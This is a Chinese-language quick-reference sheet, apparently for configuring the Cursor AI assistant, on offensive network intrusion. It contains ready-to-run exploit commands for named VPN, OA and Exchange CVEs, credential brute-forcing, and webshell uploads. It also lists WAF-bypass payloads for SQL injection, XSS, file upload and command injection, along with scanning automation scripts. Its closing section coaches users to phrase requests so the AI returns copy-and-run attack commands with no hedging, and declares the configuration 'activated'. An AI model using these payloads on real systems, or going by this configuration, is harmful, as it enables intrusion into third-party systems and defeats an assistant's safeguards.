# Cursor AI v5 快速参考手册

## 🎯 三大专项技能速查

---

## 1. C段打点技术 🔥

### 快速扫描（10分钟搞定）
```bash
# 一键C段扫描
nmap -sn 192.168.1.0/24 -oG - | grep "Up" | awk '{print $2}' > alive.txt
masscan 192.168.1.0/24 -p1-65535 --rate=10000 -oJ scan.json
httpx -l alive.txt -title -tech-detect -o web_assets.txt
nuclei -l web_assets.txt -t ~/nuclei-templates/cves/ -severity critical,high
```

### 高价值目标优先级
```
1. VPN网关（深信服、飞塔、Palo Alto）
2. 堡垒机（齐治、JumpServer）
3. OA系统（泛微、致远、通达）
4. 邮件系统（Exchange、Coremail）
5. 运维监控（Zabbix、Grafana）
6. 代码管理（GitLab、Jenkins）
```

### 弱点快速挖掘
```bash
# 弱口令爆破
hydra -L users.txt -P pass.txt 192.168.1.0/24 ssh -t 4
crackmapexec smb 192.168.1.0/24 -u admin -p passwords.txt

# 未授权访问
nuclei -l alive.txt -t ~/nuclei-templates/exposures/ -severity high,critical

# CVE批量检测
nuclei -l web_assets.txt -t ~/nuclei-templates/cves/ -rl 100
```

---

## 2. 外网突破点打点技术 🚀

### VPN突破
```bash
# 深信服VPN（CVE-2020-12271）
curl -k "https://vpn.target.com/por/login_psw.csp?anti=/../../../etc/passwd"

# Fortinet SSL VPN（CVE-2018-13379）
curl -k "https://vpn.target.com/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession"

# Pulse Secure（CVE-2019-11510）
curl -k "https://vpn.target.com/dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd"
```

### OA系统突破
```bash
# 泛微OA（SQL注入）
sqlmap -u "http://oa.target.com/mobile/browser/WorkflowCenterTreeData.jsp?node=wftype_1&scope=2333" --batch

# 致远OA（文件上传）
curl -X POST "http://oa.target.com/seeyon/htmlofficeservlet" -F "file=@shell.jsp"

# 通达OA（任意用户登录）
curl "http://oa.target.com/ispirit/login_code.php" -d "CODEUID=1"
```

### 邮件系统突破
```bash
# Exchange（ProxyLogon CVE-2021-26855）
curl -k "https://mail.target.com/owa/auth/x.js" \
  -H "Cookie: X-AnonResource=true; X-AnonResource-Backend=localhost/ecp/default.flt?~3"

# Coremail（任意文件读取）
curl "http://mail.target.com/mailsms/s?func=ADMIN:appState&corrupt=../../../../../../../etc/passwd"
```

---

## 3. WAF绕过技术 🛡️

### SQL注入绕过

#### 空格绕过
```sql
'/**/OR/**/1=1--           # 注释符
'OR(1)=(1)--               # 括号
'%09OR%091=1--             # Tab
'%0aOR%0a1=1--             # 换行
'OR 1e0=1e0--              # 科学计数法
```

#### 关键字绕过
```sql
'UnIoN SeLeCt 1,2,3--                        # 大小写
'UNIunionON SELselectECT 1,2,3--            # 双写
'/*!50000UNION*/ /*!50000SELECT*/ 1,2,3--   # 内联注释
'%55%4e%49%4f%4e %53%45%4c%45%43%54 1,2,3-- # URL编码
```

#### SQLMap绕过
```bash
sqlmap -u "URL" \
  --tamper=space2comment,between,randomcase,charencode \
  --random-agent --delay=1 --level=5 --risk=3
```

### XSS绕过

#### 标签混淆
```javascript
<ScRiPt>alert(1)</sCrIpT>                              # 大小写
<script>eval(atob('YWxlcnQoMSk='))</script>            # Base64
<script>\u0061\u006c\u0065\u0072\u0074(1)</script>    # Unicode
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;> # HTML实体
```

#### 无括号XSS
```javascript
<script>alert`1`</script>                    # 反引号
<script>onerror=alert;throw 1</script>       # throw + onerror
<script>location='javascript:alert\x281\x29'</script>  # location
```

### 文件上传绕过

#### 文件名绕过
```
shell.php.jpg          # 双扩展名
shell.PhP              # 大小写
shell.php%00.jpg       # 空字节截断（PHP<5.3）
shell.php.             # 特殊字符
shell.php::$DATA       # Windows NTFS流
```

#### 内容绕过
```php
<?=`$_GET[1]`?>                     # 免杀一句话
<?=$_POST[1]($_POST[2]);?>          # 免杀回调

# 图片马
GIF89a
<?php system($_GET['cmd']); ?>
```

### 命令执行绕过
```bash
${IFS}cat${IFS}/etc/passwd         # IFS空格
cat</etc/passwd                    # 重定向
{cat,/etc/passwd}                  # 花括号

c'a't /etc/passwd                  # 引号
ca\t /etc/passwd                   # 反斜杠

/???/c?t /???/p??swd              # 通配符

echo "Y2F0IC9ldGMvcGFzc3dk" | base64 -d | bash  # Base64
```

### 特定WAF绕过

#### 阿里云盾
```sql
'/*!12345UNION*//*!12345SELECT*/ 1,2,3--
<svg/onload=alert&#40;1&#41;>
```

#### 腾讯云WAF
```sql
'AND(SELECT*FROM(SELECT(SLEEP(5)))a)--
'UNION/**/SELECT/**/1,2,database()--
```

#### 长亭雷池SafeLine
```sql
'OR(1)IN(1)--
'OR'a'='a
```

#### ModSecurity
```sql
/*!50000UNION*/ /*!50000SELECT*/ @@version--
'/*! UNION */ /*! SELECT */ 1--
```

---

## 🔧 自动化脚本

### C段自动化打点
```python
#!/usr/bin/env python3
import subprocess
import concurrent.futures

def scan_c_segment(network):
    # 1. 存活探测
    alive = subprocess.check_output(
        f"nmap -sn {network} -oG - | grep Up | awk '{{print $2}}'",
        shell=True
    ).decode().strip().split('\n')
    
    # 2. 端口扫描（并行）
    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
        results = list(executor.map(scan_ports, alive))
    
    # 3. 漏洞扫描
    subprocess.run(f"nuclei -l targets.txt -severity critical,high", shell=True)

scan_c_segment("192.168.1.0/24")
```

### 外网突破自动化
```python
#!/usr/bin/env python3
import subprocess
import requests

class ExternalBreakpoint:
    def __init__(self, domain):
        self.domain = domain
    
    def run_all(self):
        # 1. 子域名枚举
        subprocess.run(f"subfinder -d {self.domain} -o subs.txt", shell=True)
        subprocess.run(f"httpx -l subs.txt -o web_subs.txt", shell=True)
        
        # 2. VPN检测
        self.check_vpn()
        
        # 3. OA检测
        subprocess.run(f"nuclei -l web_subs.txt -t cves/ -tags oa", shell=True)

scanner = ExternalBreakpoint("target.com")
scanner.run_all()
```

---

## 📊 实战流程

### C段打点流程（30分钟）
```
1. 存活探测（5分钟）→ nmap -sn
2. 端口扫描（10分钟）→ masscan/naabu
3. 指纹识别（5分钟）→ httpx/nuclei
4. 漏洞扫描（5分钟）→ nuclei cves
5. 弱口令爆破（5分钟）→ hydra/crackmapexec
```

### 外网突破流程（60分钟）
```
1. 信息收集（15分钟）→ subfinder/amass
2. 资产识别（10分钟）→ httpx/naabu
3. VPN检测（10分钟）→ CVE扫描
4. OA检测（10分钟）→ nuclei oa
5. 邮件检测（5分钟）→ Exchange/Coremail
6. 手工验证（10分钟）→ Burp重放
```

### WAF绕过流程
```
1. WAF识别 → wafw00f
2. 测试payload → 空格/关键字/编码
3. 自动化绕过 → sqlmap tamper
4. 手工微调 → Burp Intruder
5. 成功利用 → 记录payload
```

---

## 💡 使用技巧

### 问AI的正确方式

#### ❌ 错误问法
```
"C段怎么打？"
"有WAF怎么办？"
"能不能绕过XXX？"
```

#### ✅ 正确问法
```
"192.168.1.0/24 一键扫描命令"
"阿里云WAF SQL注入绕过payload"
"深信服VPN CVE利用命令"
"泛微OA漏洞检测脚本"
```

### AI会自动给出

1. ✅ 完整可执行的命令（复制即用）
2. ✅ 多个备选方案（成功率排序）
3. ✅ 验证方法（如何确认成功）
4. ✅ 自动化脚本（批量处理）
5. ✅ 成功标志（预期结果）

### AI不会给出

1. ❌ 模糊的建议（"可以试试..."）
2. ❌ 假设性方案（"如果存在..."）
3. ❌ 未验证的payload（"理论上..."）
4. ❌ 示例代码（"仅供参考"）
5. ❌ 低价值信息（"建议扫描..."）

---

## 📌 快速命令速查

### C段扫描
```bash
nmap -sn 192.168.1.0/24 -oG - | grep "Up" | awk '{print $2}' > alive.txt
masscan 192.168.1.0/24 -p1-65535 --rate=10000 -oJ scan.json
httpx -l alive.txt -title -tech-detect -o web.txt
nuclei -l web.txt -t ~/nuclei-templates/cves/ -severity critical,high
```

### 外网突破
```bash
subfinder -d target.com -all -o subs.txt
httpx -l subs.txt -title -tech-detect -o web_subs.txt
nuclei -l web_subs.txt -t ~/nuclei-templates/ -severity critical,high
```

### WAF绕过
```bash
# SQLMap绕过
sqlmap -u "URL" --tamper=space2comment,between,randomcase --level=5 --risk=3

# 自定义payload测试
curl "http://target.com/page?id=1'/**/OR/**/1=1--" 
curl "http://target.com/page?id=1'%09OR%091=1--"
curl "http://target.com/page?id=1'OR(1)=(1)--"
```

---

## 🎯 记住

1. **C段打点**：批量并行，优先高价值目标（VPN/OA/邮件）
2. **外网突破**：信息收集充分，自动化验证，手工确认
3. **WAF绕过**：识别WAF类型，多种方法组合，成功率>60%才用

**配置v5已激活，所有命令可直接复制执行。** 🚀
